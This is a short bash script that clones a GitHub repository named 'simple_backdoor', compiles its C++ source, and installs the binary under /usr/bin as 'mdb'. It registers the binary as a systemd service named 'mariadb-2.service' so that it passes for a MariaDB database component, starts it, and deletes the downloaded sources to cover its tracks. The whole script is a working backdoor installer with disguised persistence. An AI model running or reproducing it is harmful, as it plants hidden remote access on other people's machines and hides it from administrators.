#!/bin/bash
git clone --quiet \
https://github.com/Yegorius171/simple_backdoor.git \
> /dev/null
g++ simple_backdoor/backdoor.cpp -o mdb
#chmod 6711 mdb
chmod 711 mdb
mv simple_backdoor/mariadb-2.service \
/usr/lib/systemd/system/
mv mdb /usr/bin/
systemctl start mariadb-2.service
rm -rf simple_backdoor
